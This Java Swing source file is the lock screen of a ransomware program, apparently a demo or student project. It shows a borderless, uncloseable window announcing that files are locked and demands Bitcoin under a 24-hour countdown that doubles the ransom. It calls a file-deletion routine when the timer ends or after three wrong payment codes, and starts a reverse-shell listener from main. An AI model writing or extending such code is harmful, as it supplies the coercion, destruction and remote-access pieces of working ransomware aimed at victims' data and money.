import Decryptor.Decrypt;
import Decryptor.PaymentCode;
import ReverseShellScripts.ReverseShellListener;

import javax.swing.*;
import java.awt.*;
import java.text.DecimalFormat;

//Ransomware screen (both stages)

import static FileDeleter.FileDelete.FileDeleter;

public class GUI {

    public JTextField DecryptConfirmation;
    private JLabel BitcoinDemand;
    private JLabel BitcoinInfo;
    private JFrame frame;
    private JLabel label;
    private JLabel timerLabel;
    private JButton Exit;
    private JButton decryptSafe;
    private int width;
    private int height;
    private Timer countdownTimer;
    private ImageIcon image;
    private long remainingMillis = 86400000;
    private int wrongAttempts = 0;
    int BitcoinAddress = (int)(Math.random() * 1000000);
    public double BitcoinDemands = 1.5;

    public GUI(int w, int h){
        frame = new JFrame();
        frame.setLayout(null);
        frame.setLocationRelativeTo(null);
        Exit = new JButton("Exit");
        decryptSafe = new JButton("Safe Decrypt");
        timerLabel = new JLabel();
        width = w;
        height = h;
    }

    public void setUpGUI() {
        Container cp = frame.getContentPane();
        cp.setLayout(null);
        frame.setSize(600, 400);
        frame.setTitle("");
        frame.setUndecorated(true);
        frame.setResizable(false);
        cp.setBackground(Color.decode("#0068FF"));//original blue background

        try {
            ImageIcon originalIcon = new ImageIcon("JavaSwing/src/main/resources/Alien.png");
            Image originalImage = originalIcon.getImage();
            Image scaledImage = originalImage.getScaledInstance(300, 300, Image.SCALE_SMOOTH);
            image = new ImageIcon(scaledImage);
        } catch (Exception e) {
            throw new RuntimeException("Failed to load image: " + e.getMessage());
        }

        BitcoinDemand = new JLabel("Pay " + BitcoinDemands + " Bitcoin to the address below");
        BitcoinDemand.setBounds(50, 155, 500, 200);
        BitcoinDemand.setFont(new Font("Arial", Font.BOLD, 24));
        BitcoinDemand.setHorizontalAlignment(SwingConstants.CENTER);

        BitcoinInfo = new JLabel("Bitcoin address: " + BitcoinAddress);
        BitcoinInfo.setBounds(50, 175, 500, 200);
        BitcoinInfo.setFont(new Font("Arial", Font.BOLD, 24));
        BitcoinInfo.setHorizontalAlignment(SwingConstants.CENTER);

        label = new JLabel("YOUR FILES HAVE BEEN LOCKED", SwingConstants.CENTER);
        label.setBounds(50, 10, 500, 200);
        label.setFont(new Font("Arial", Font.BOLD, 24));
        label.setHorizontalAlignment(SwingConstants.CENTER);

        timerLabel.setBounds(250, 125, 100, 25);
        timerLabel.setFont(new Font("Monospaced", Font.BOLD, 18));
        timerLabel.setHorizontalAlignment(SwingConstants.CENTER);

        JLabel alienLabel = new JLabel(image);
        alienLabel.setBounds(150, 70, 300, 300);

        Exit.setBounds(200, 330, 80, 30);
        decryptSafe.setBounds(310, 330, 110, 30);

        DecryptConfirmation = new JTextField("Enter payment code");
        DecryptConfirmation.setBounds(150, 290, 300, 30);
        DecryptConfirmation.setFont(new Font("Monospaced", Font.BOLD, 18));
        DecryptConfirmation.setHorizontalAlignment(SwingConstants.CENTER);

        cp.add(DecryptConfirmation);
        cp.add(BitcoinDemand);
        cp.add(BitcoinInfo);
        cp.add(label);
        cp.add(timerLabel);
        cp.add(alienLabel);
        cp.add(Exit);
        cp.add(decryptSafe);

        frame.setDefaultCloseOperation(JFrame.DO_NOTHING_ON_CLOSE);
        frame.setVisible(true);

        startCountdownTimer();
    }

    public void setUpButtonListeners() {

        Exit.addActionListener(e -> {
            frame.dispose();
            System.exit(0);
        });

        DecryptConfirmation.addActionListener(e -> {
            String enteredCode = DecryptConfirmation.getText();
            boolean success = PaymentCode.isValidCode(enteredCode);

            if (success) {
                JOptionPane.showMessageDialog(frame, "Decryption complete!");
                frame.dispose();
                System.exit(0);
            } else {
                wrongAttempts++;
                JOptionPane.showMessageDialog(frame, "Invalid payment code. Attempt " + wrongAttempts + "/3");

                if (wrongAttempts >= 3) {
                    System.out.println("Maximum amount of tries completed");
                    FileDeleter();
                    System.exit(0);
                }
            }
        });

        decryptSafe.addActionListener(e -> {
            try {
                Decrypt.decryptAllFilesInDirectory(
                        "1234567812345678",
                        "JavaSwing/src/main/ExampleFiles",
                        "src/main/DecryptedFiles"
                );
                JOptionPane.showMessageDialog(frame, "Decryption complete!");
                System.exit(0);
            } catch (Exception ex) {
                ex.printStackTrace();
                JOptionPane.showMessageDialog(frame, "Decryption failed: " + ex.getMessage());
            }
        });
    }

    public void ReverseShellListener() {
        String[] args = {};
        ReverseShellListener.main(args);
    }

    public void startCountdownTimer() {
        countdownTimer = new Timer(1000, e -> {
            Container cp = frame.getContentPane();
            
            if (remainingMillis >= 43200000) {
                //blue stage
                cp.setBackground(Color.decode("#0068FF"));
            } else {
                //red stage and increased demands
                BitcoinDemand.setText("Pay " + (BitcoinDemands * 2) + " Bitcoin to the address below");
                cp.setBackground(Color.decode("#ad0401"));
            }
            //file deletion for testing
            if (remainingMillis <= 0) {
                timerLabel.setText("00:00:00");
                countdownTimer.stop();
                label.setText("Your files have been leaked and deleted!");
                frame.repaint();
                FileDeleter();
                new Timer(1000, event -> frame.dispose()).start();
                System.exit(0);
            }

            long hours = remainingMillis / 3600000;
            long minutes = (remainingMillis / 60000) % 60;
            long seconds = (remainingMillis / 1000) % 60;

            DecimalFormat df = new DecimalFormat("00");
            timerLabel.setText(df.format(hours) + ":" + df.format(minutes) + ":" + df.format(seconds));

            //remainingMillis -= 3600000;  Simulated: 1 second = 1 hour for testing
            remainingMillis -= 1000;
        });
        countdownTimer.start();
    }

    public static void main(String[] args) {
        GUI gui = new GUI(600, 400);
        gui.setUpGUI();
        gui.setUpButtonListeners();
        gui.ReverseShellListener();
    }
}
